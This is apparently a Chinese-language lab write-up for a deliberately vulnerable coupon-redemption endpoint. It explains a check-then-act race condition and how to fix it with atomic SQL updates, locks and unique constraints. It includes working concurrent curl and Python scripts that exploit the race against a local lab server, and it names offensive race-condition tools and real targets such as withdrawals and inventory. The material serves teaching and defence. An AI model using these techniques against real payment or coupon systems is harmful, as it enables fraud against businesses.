# 优惠券领取处的竞态条件

## 这一题在教什么

**「先查再改」永远不是原子的。**

很多人以为竞态是「偶尔出现的 bug」，所以不值得认真对待。实际上它是**可稳定利用的
漏洞类别** —— 只要你能让请求在时间上重叠，就能稳定打出来。

它还有个特点：**代码看起来完全正确**。你盯着 `if redeemed: return` 看半天，
找不出任何一行是错的。错的是「这两行之间没有保证」。

## 漏洞在哪

`module.py` 的 `redeem()`：

```python
if _STATE["redeemed"]:      # ① 检查
    return redirect(...)
time.sleep(WINDOW_SECONDS)  # ② 窗口
with _LOCK:
    _STATE["redeemed"] += 1 # ③ 动手
    _STATE["balance"] += COUPON_AMOUNT
```

两个请求同时进来时，执行顺序可以是：

```
请求A: ① 读到「没领过」 ─────────────┐
请求B: ① 读到「没领过」 ─────────────┤ 两个都通过了检查
请求A:                              ③ 加 100
请求B:                              ③ 再加 100
```

结果余额 200，但「每人只能领一次」。

`time.sleep` 是**故意加的**，把窗口放大到肉眼可见。现实里窗口是微秒级 ——
但「微秒级」不等于「打不中」，只是需要更高的并发或更精准的对齐。

## 怎么打通

**最省事的办法，curl 并发：**

```bash
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -X POST \
  'http://127.0.0.1:8800/v/race_condition/coupon_redeem/redeem'
```

跑完刷新页面：余额 > 100 就通了。

**Python 也行：**

```python
import concurrent.futures, requests

url = "http://127.0.0.1:8800/v/race_condition/coupon_redeem/redeem"
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
    futures = [pool.submit(requests.post, url) for _ in range(30)]
    concurrent.futures.wait(futures)
```

**真实渗透里的专业工具：**

| 工具 | 特点 |
|---|---|
| Burp Suite **Turbo Intruder** | 单包多请求（HTTP/2 上尤其狠），时间对齐到毫秒级 |
| Burp **Repeater** 的 "Send group in parallel" | 手动小规模就够用 |
| `race-the-web` (Python) | 专门做竞态的脚本工具 |
| `h2spacex`、`h2-race` | 利用 HTTP/2 单 TCP 连接发多请求 |

**为什么 HTTP/2 更适合打竞态：** 多个请求可以在同一个 TCP 连接里几乎同时到达，
省掉了建连和网络抖动带来的时间差。

**其他常见的竞态场景**（同一个套路）：

- 兑换码 / 邀请码只能兑一次
- 提现 / 转账（余额检查与扣款之间）
- 库存扣减（超卖）
- 「只能投一票」的投票
- 文件上传时「检查允许的扩展名」和「写入文件」之间

## 怎么修

**核心：把 check 和 act 合成一个原子操作。** 三个层次：

**1. 数据库级别（最可靠）**

```sql
UPDATE coupons SET used = 1, used_at = NOW()
WHERE user_id = ? AND used = 0;
```

然后看 `rowcount` / `cursor.rowcount`：

```python
cur = conn.execute("UPDATE ... WHERE user_id = ? AND used = 0", (uid,))
if cur.rowcount == 0:
    return "已经领过了"        # 没抢到
# rowcount == 1 才算真的领到
```

**让数据库来判断，而不是让应用层判断。** UPDATE 的 WHERE 条件是原子的。

**2. 加锁（单机可用，分布式麻烦）**

```python
with _LOCK:
    if _STATE["redeemed"]:
        return ...
    _STATE["redeemed"] += 1
    _STATE["balance"] += AMOUNT
```

单进程有效，但多进程 / 多机部署就失效了 —— 得用分布式锁（Redis `SET NX`），
而分布式锁自己也有坑（锁超时、脑裂、Redlock 的争议）。

**3. 唯一约束（最优雅的"不可能"）**

```sql
CREATE UNIQUE INDEX one_coupon_per_user ON coupon_claims (user_id, coupon_id);
```

让第二次插入直接违反约束报错。**从根本上让「多次领取」这个状态无法存在**，
比任何检查都可靠。

**配套：**

- **幂等键**：客户端带一个 `Idempotency-Key`，服务端去重。防的是重试，不是竞态。
- **限流**：并发打不上去，窗口就难命中。是缓解不是修复。
- **在业务上接受并发**：有些场景（点赞数）本来就允许并发，那就别用「先查再改」。

## 顺手想想

- 如果只有一个 CPU 核心，或者服务端是单线程的，这个竞态还存在吗？
  （提示：想想 GIL 锁的是什么，以及 `time.sleep` 会释放 GIL 意味着什么）
- 这道题的 `_STATE` 在进程内存里 —— 如果靶场开了多个 worker 进程，会发生什么？
  修法要不要变？
- 「加锁」为什么在多机部署下不够？分布式锁最容易出错的地方是哪一步？
